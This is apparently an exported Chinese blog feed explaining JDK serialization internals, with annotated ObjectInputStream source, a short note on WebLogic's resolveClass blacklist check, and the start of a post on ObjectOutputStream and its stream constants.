(numFields &gt; <span class="number">0</span>) ?</span><br><span class="line">        <span class="keyword">new</span> ObjectStreamField[numFields] : NO_FIELDS;</span><br><span class="line">    <span class="comment">// 循环获取每个类属性</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numFields; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span> tcode = (<span class="keyword">char</span>) in.readByte();</span><br><span class="line">        String fname = in.readUTF();</span><br><span class="line">        String signature = ((tcode == <span class="string">'L'</span>) || (tcode == <span class="string">'['</span>)) ?</span><br><span class="line">            in.readTypeString() : <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; tcode &#125;);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            fields[i] = <span class="keyword">new</span> ObjectStreamField(fname, signature, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> (IOException) <span class="keyword">new</span> InvalidClassException(name,</span><br><span class="line">                <span class="string">"invalid descriptor for field "</span> + fname).initCause(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    computeFieldOffsets();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="readExternalData-readSerialData获取对象属性域信息："><a href="#readExternalData-readSerialData获取对象属性域信息：" class="headerlink" title="readExternalData/readSerialData获取对象属性域信息："></a>readExternalData/readSerialData获取对象属性域信息：</h5><p>readSerialData未重写readObject会调用默认处理方法defaultReadFields</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readSerialData</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectStreamClass.ClassDataSlot[] slots = desc.getClassDataLayout();</span><br><span class="line">   <span class="comment">// 循环获取每个属性值数据</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; slots.length; i++) &#123;</span><br><span class="line">            ObjectStreamClass slotDesc = slots[i].desc;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (slots[i].hasData) &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj == <span class="keyword">null</span> || handles.lookupException(passHandle) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    defaultReadFields(<span class="keyword">null</span>, slotDesc); <span class="comment">// skip field values</span></span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (slotDesc.hasReadObjectMethod()) &#123;</span><br><span class="line">                    ThreadDeath t = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">boolean</span> reset = <span class="keyword">false</span>;</span><br><span class="line">                    SerialCallbackContext oldContext = curContext;</span><br><span class="line">                    <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">                        oldContext.check();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        curContext = <span class="keyword">new</span> SerialCallbackContext(obj, slotDesc);</span><br><span class="line"></span><br><span class="line">                        bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="comment">// 重写readObject，调用重写方法</span></span><br><span class="line">                        slotDesc.invokeReadObject(obj, <span class="keyword">this</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                        handles.markException(passHandle, ex);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="keyword">do</span> &#123;</span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                curContext.setUsed();</span><br><span class="line">                                <span class="keyword">if</span> (oldContext!= <span class="keyword">null</span>)</span><br><span class="line">                                    oldContext.check();</span><br><span class="line">                                curContext = oldContext;</span><br><span class="line">                                reset = <span class="keyword">true</span>;</span><br><span class="line">                            &#125; <span class="keyword">catch</span> (ThreadDeath x) &#123;</span><br><span class="line">                                t = x;  <span class="comment">// defer until reset is true</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">while</span> (!reset);</span><br><span class="line">                        <span class="keyword">if</span> (t != <span class="keyword">null</span>)</span><br><span class="line">                            <span class="keyword">throw</span> t;</span><br><span class="line">                    &#125;</span><br><span class="line">                    defaultDataEnd = <span class="keyword">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//非重写，调用defaultReadFields</span></span><br><span class="line">                    defaultReadFields(obj, slotDesc);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (slotDesc.hasWriteObjectData()) &#123;</span><br><span class="line">                    skipCustomData();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    bin.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (obj != <span class="keyword">null</span> &amp;&amp;</span><br><span class="line">                    slotDesc.hasReadObjectNoDataMethod() &amp;&amp;</span><br><span class="line">                    handles.lookupException(passHandle) == <span class="keyword">null</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    slotDesc.invokeReadObjectNoData(obj);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用 类实现的readExternal方法获取</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readExternalData</span><span class="params">(Externalizable obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    SerialCallbackContext oldContext = curContext;</span><br><span class="line">    <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">        oldContext.check();</span><br><span class="line">    curContext = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">boolean</span> blocked = desc.hasBlockExternalData();</span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            bin.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 调用 实现的readExternal方法获取</span></span><br><span class="line">                obj.readExternal(<span class="keyword">this</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * In most cases, the handle table has already propagated</span></span><br><span class="line"><span class="comment">                 * a CNFException to passHandle at this point; this mark</span></span><br><span class="line"><span class="comment">                 * call is included to address cases where the readExternal</span></span><br><span class="line"><span class="comment">                 * method has cons'ed and thrown a new CNFException of its</span></span><br><span class="line"><span class="comment">                 * own.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                 handles.markException(passHandle, ex);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (blocked) &#123;</span><br><span class="line">            skipCustomData();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (oldContext != <span class="keyword">null</span>)</span><br><span class="line">            oldContext.check();</span><br><span class="line">        curContext = oldContext;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="defaultReadFields：属性值具体操作"><a href="#defaultReadFields：属性值具体操作" class="headerlink" title="defaultReadFields：属性值具体操作"></a>defaultReadFields：属性值具体操作</h5><ul><li>获取所有原生类型的属性数据并赋值对象属性：调用ObjectStreamClass#setPrimFieldValues给所有属性进行赋值</li><li>获取所有非原生类型的属性数据并赋值：循环读取每个非原生属性，用readObject0递归调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defaultReadFields</span><span class="params">(Object obj, ObjectStreamClass desc)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 获取类</span></span><br><span class="line">    Class&lt;?&gt; cl = desc.forClass();</span><br><span class="line">    <span class="keyword">if</span> (cl != <span class="keyword">null</span> &amp;&amp; obj != <span class="keyword">null</span> &amp;&amp; !cl.isInstance(obj)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*** 1、获取所有原生类型的属性数据并赋值对象属性**/</span></span><br><span class="line">    <span class="comment">// 获取属性是原生类型的属性数据个数</span></span><br><span class="line">    <span class="keyword">int</span> primDataSize = desc.getPrimDataSize();</span><br><span class="line">    <span class="keyword">if</span> (primVals == <span class="keyword">null</span> || primVals.length &lt; primDataSize) &#123;</span><br><span class="line">        primVals = <span class="keyword">new</span> <span class="keyword">byte</span>[primDataSize];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取所有原生类型的属性数据</span></span><br><span class="line">        bin.readFully(primVals, <span class="number">0</span>, primDataSize, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;<span class="comment">// 检查是否实例化</span></span><br><span class="line">        <span class="comment">// 设置属性值 即赋值操作</span></span><br><span class="line">        desc.setPrimFieldValues(obj, primVals);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> objHandle = passHandle;</span><br><span class="line">    <span class="comment">/*** 2、获取所有非原生类型的属性数据并赋值 **/</span></span><br><span class="line">    ObjectStreamField[] fields = desc.getFields(<span class="keyword">false</span>);</span><br><span class="line">    <span class="comment">// 给每个非原生类型属性进行实例化一个对象操作</span></span><br><span class="line">    Object[] objVals = <span class="keyword">new</span> Object[desc.getNumObjFields()];</span><br><span class="line">    <span class="keyword">int</span> numPrimFields = fields.length - objVals.length;</span><br><span class="line">    <span class="comment">// 循环读取每个非原生属性，用readObject0递归调用</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; objVals.length; i++) &#123;</span><br><span class="line">        ObjectStreamField f = fields[numPrimFields + i];</span><br><span class="line">        objVals[i] = readObject0(f.isUnshared());</span><br><span class="line">        <span class="keyword">if</span> (f.getField() != <span class="keyword">null</span>) &#123;</span><br><span class="line">            handles.markDependency(objHandle, passHandle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (obj != <span class="keyword">null</span>) &#123;</span><br><span class="line">        desc.setObjFieldValues(obj, objVals);</span><br><span class="line">    &#125;</span><br><span class="line">    passHandle = objHandle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectStreamClass#setPrimFieldValues</span></span><br><span class="line"><span class="comment">// 原生属性类型赋值，将字节buf付给obj属性</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setPrimFieldValues</span><span class="params">(Object obj, <span class="keyword">byte</span>[] buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环赋值</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; numPrimFields; i++) &#123;</span><br><span class="line">        <span class="keyword">long</span> key = writeKeys[i];</span><br><span class="line">        <span class="keyword">if</span> (key == Unsafe.INVALID_FIELD_OFFSET) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;           <span class="comment">// discard value</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> off = offsets[i];</span><br><span class="line">        <span class="comment">// 根据序列化后类型码进行赋值，如类型码为Z，则按照布尔类型给obj赋值</span></span><br><span class="line">        <span class="keyword">switch</span> (typeCodes[i]) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">'Z'</span>:</span><br><span class="line">                unsafe.putBoolean(obj, key, Bits.getBoolean(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'B'</span>:</span><br><span class="line">                unsafe.putByte(obj, key, buf[off]);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'C'</span>:</span><br><span class="line">                unsafe.putChar(obj, key, Bits.getChar(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'S'</span>:</span><br><span class="line">                unsafe.putShort(obj, key, Bits.getShort(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'I'</span>:</span><br><span class="line">                unsafe.putInt(obj, key, Bits.getInt(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'F'</span>:</span><br><span class="line">                unsafe.putFloat(obj, key, Bits.getFloat(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'J'</span>:</span><br><span class="line">                unsafe.putLong(obj, key, Bits.getLong(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="string">'D'</span>:</span><br><span class="line">                unsafe.putDouble(obj, key, Bits.getDouble(buf, off));</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InternalError();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3、总结-对象输入流规则"><a href="#3、总结-对象输入流规则" class="headerlink" title="3、总结-对象输入流规则"></a>3、总结-对象输入流规则</h4><p>跟对象输出规则一致，也是按照三部分进行，其实每部分也都一样的，不过一个是写入，一个是读取罢了。</p><p>ObjectInputStream读取规则如下：</p><ol><li>第一部分获取序列化头信息：描述序列化协议的信息和版本；</li><li>第二部分获取类元信息包括序列化的类名称、以及哪些属性是被序列化的，获取到后用newInstance构造一个类的对象。</li><li>第三部分获取属性域的值信息，赋值对应序列化的每个属性。</li></ol><h4 id="更新-拓展："><a href="#更新-拓展：" class="headerlink" title="更新-拓展："></a>更新-拓展：</h4><p>weblogic经常打补丁的地方：resolveClass。</p><p>1、原生ObjectInputStream.resolveClass很简单，就是获取类名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc)</span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    String name = desc.getName();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Class.forName(name, <span class="keyword">false</span>, latestUserDefinedLoader());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        Class&lt;?&gt; cl = primClasses.get(name);</span><br><span class="line">        <span class="keyword">if</span> (cl != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> cl;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> ex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在readNonProxyDesc中进行了调用</p><p><img src="/imgs/image-20210809165619482.png" alt="image-20210809165619482"></p><p>在readClassDesc中，当TC是一个类描述符，调用readNonProxyDesc获取类名。</p><p><img src="/imgs/image-20210809165722640.png" alt="image-20210809165722640"></p><p>2、Weblogic的<code>weblogic.rjvm.InboundMsgAbbrev</code>中，对类进行了黑名单检测</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Class <span class="title">resolveClass</span><span class="params">(ObjectStreamClass descriptor)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 进行黑名单检测</span></span><br><span class="line">      <span class="keyword">this</span>.checkLegacyBlacklistIfNeeded(descriptor.getName());</span><br><span class="line">   &#125; <span class="keyword">catch</span> (InvalidClassException var4) &#123;</span><br><span class="line">      <span class="keyword">throw</span> var4;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   Class c = <span class="keyword">super</span>.resolveClass(descriptor);</span><br><span class="line">   <span class="keyword">if</span>(c == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"super.resolveClass returns null."</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ObjectStreamClass localDesc = ObjectStreamClass.lookup(c);</span><br><span class="line">      <span class="keyword">if</span>(localDesc != <span class="keyword">null</span> &amp;&amp; localDesc.getSerialVersionUID() != descriptor.getSerialVersionUID()) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> ClassNotFoundException(<span class="string">"different serialVersionUID. local: "</span> + localDesc.getSerialVersionUID() + <span class="string">" remote: "</span> + descriptor.getSerialVersionUID());</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA安全 </category>
          
          <category> 序列化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JDK序列化机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK序列化机制及源码解读二：ObjectOutputStream对象输出流</title>
      <link href="2021/06/28/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%BA%8C%EF%BC%9AObjectOutputStream%E5%AF%B9%E8%B1%A1%E8%BE%93%E5%87%BA%E6%B5%81/"/>
      <url>2021/06/28/JDK%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%8F%8A%E6%BA%90%E7%A0%81%E8%A7%A3%E8%AF%BB%E4%BA%8C%EF%BC%9AObjectOutputStream%E5%AF%B9%E8%B1%A1%E8%BE%93%E5%87%BA%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<p>这是Java序列化机制及源码解读系列的第二篇，主要学习源码处理对象输出流的方法。接下来会先学习ObjectOutputStream的父类，然后再探究ObjectOutputStream。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ObjectOutputStream</span></span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">OutputStream</span> <span class="keyword">implements</span> <span class="title">ObjectOutput</span>, <span class="title">ObjectStreamConstants</span></span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210628141109140.png" alt="ObjectOutputStream UML图"></p><p>学习ObjectOutputStream前，先了解下其父类。</p><h2 id="一、DataOutput"><a href="#一、DataOutput" class="headerlink" title="一、DataOutput"></a>一、DataOutput</h2><p>DataOutput接口提供将数据从任何Java基本类型（byte、short、int、long、float、double、char、boolean）转换为一系列字节，并将这些字节写入二进制流。  还有一种将<code>String</code>转换为modified UTF-8格式并编写结果字节系列的功能。 </p><p>DataOutput定义了以下接口方法：</p><table><thead><tr><th>Modifier and Type</th><th>Method and Description</th></tr></thead><tbody><tr><td>void</td><td>write(byte[] b)：将输出流写入数组 b中的所有字节。</td></tr><tr><td>void</td><td>write(byte[] b, int off, int len)：从阵列 b写入 len字节，以输出流。</td></tr><tr><td>void</td><td>write(int b)：向输出流写入参数 b的八个低位。</td></tr><tr><td>void</td><td>writeBoolean(boolean v)：将 boolean值写入此输出流。</td></tr><tr><td>void</td><td>writeByte(int v)：向输出流写入参数 v的八个低位位。</td></tr><tr><td>void</td><td>writeBytes(String s)：将一个字符串写入输出流。</td></tr><tr><td>void</td><td>writeChar(int v)：将两个字节组成的 char值写入输出流。</td></tr><tr><td>void</td><td>writeChars(String s)：写入每一个字符在字符串中 s ，到输出流中，为了，每个字符使用两个字节。</td></tr><tr><td>void</td><td>writeDouble(double v)：将 double值（由8个字节组成）写入输出流。</td></tr><tr><td>void</td><td>writeFloat(float v)：将 float值写入输出流，该值由四个字节组成。</td></tr><tr><td>void</td><td>writeInt(int v)：将 int值（由四个字节组成）写入输出流。</td></tr><tr><td>void</td><td>writeLong(long v)：将 long值（由八个字节组成）写入输出流。</td></tr><tr><td>void</td><td>writeShort(int v)：将两个字节写入输出流以表示参数的值。</td></tr><tr><td>void</td><td>writeUTF(String s)：将两个字节的长度信息写入输出流，其后是 字符串 s中每个字符的 s 。</td></tr></tbody></table><h2 id="二、ObjectOutput"><a href="#二、ObjectOutput" class="headerlink" title="二、ObjectOutput"></a>二、ObjectOutput</h2><p>ObjectOutput扩展了DataOutput接口，除了原始类型外还添加了对象、数组和字符串的输出流。</p><table><thead><tr><th>Modifier and Type</th><th>Method and Description</th></tr></thead><tbody><tr><td>void</td><td>close():关闭流。</td></tr><tr><td>void</td><td>flush():刷新流。</td></tr><tr><td>void</td><td>write(byte[] b):写入一个字节数组。</td></tr><tr><td>void</td><td>write(byte[] b, int off, int len):写入一个子字节数组。</td></tr><tr><td>void</td><td>write(int b):写一个字节。</td></tr><tr><td>void</td><td>writeObject(Object obj):将对象写入底层存储或流。</td></tr></tbody></table><h2 id="三、OutputStream"><a href="#三、OutputStream" class="headerlink" title="三、OutputStream"></a>三、OutputStream</h2><p>这个抽象类是表示字节输出流的所有类的超类。输出流接收输出字节并将其发送到某个接收器。</p><p>需要定义<code>OutputStream</code>子类的应用<code>OutputStream</code>必须至少提供一个写入一个字节输出的方法。 </p><table><thead><tr><th>Modifier and Type</th><th>Method and Description</th></tr></thead><tbody><tr><td>void</td><td>close():关闭此输出流并释放与此流相关联的任何系统资源。</td></tr><tr><td>void</td><td>flush():刷新此输出流并强制任何缓冲的输出字节被写出。</td></tr><tr><td>void</td><td>write(byte[] b):将 b.length字节从指定的字节数组写入此输出流。</td></tr><tr><td>void</td><td>write(byte[] b, int off, int len):从指定的字节数组写入 len个字节，从偏移 off开始输出到此输出流。</td></tr><tr><td>void</td><td>write(int b):将指定的字节写入此输出流。</td></tr><tr><td>void</td><td>writeObject(Object obj):将对象写入底层存储或流。</td></tr></tbody></table><h2 id="四、ObjectStreamConstants"><a href="#四、ObjectStreamConstants" class="headerlink" title="四、ObjectStreamConstants"></a>四、ObjectStreamConstants</h2><p>ObjectStreamConstants定义了一系列的常量，用来表示对象进行序列化时单个字节数据的含义，方便后续序列化和反序列化按照此规范进行。</p><table><thead><tr><th>Modifier and Type</th><th>Field</th><th>Description</th><th>Value</th></tr></thead><tbody><tr><td>static short</td><td>STREAM_MAGIC</td><td>魔术头，标记序列化协议的信息</td><td>0xaced</td></tr><tr><td>static short</td><td>STREAM_VERSION</td><td>标记序列化协议的版本信息</td><td>0x0005</td></tr><tr><td>static byte</td><td>TC_BASE</td><td>第一个标签值</td><td>0x70</td></tr><tr><td>static byte</td><td>TC_NULL</td><td>Null对象引用,父类描述符标识</td><td>0x70</td></tr><tr><td>static byte</td><td>TC_REFERENCE</td><td>流中已存在对象的引用</td><td>0x71</td></tr><tr><td>static byte</td><td>TC_CLASSDESC</td><td>new class类描述符</td><td>0x72</td></tr><tr><td>static byte</td><td>TC_OBJECT</td><td>new 对象</td><td>0x73</td></tr><tr><td>static byte</td><td>TC_STRING</td><td>new String字符串</td><td>0x74</td></tr><tr><td>static byte</td><td>TC_ARRAY</td><td>new 数组</td><td>0x75</td></tr><tr><td>static byte</td><td>TC_CLASS</td><td>类引用</td><td>0x76</td></tr><tr><td>static byte</td><td>TC_BLOCKDATA</td><td>字节跟随标记表示此块数据中的字节数</td><td>0x77</td></tr><tr><td>static 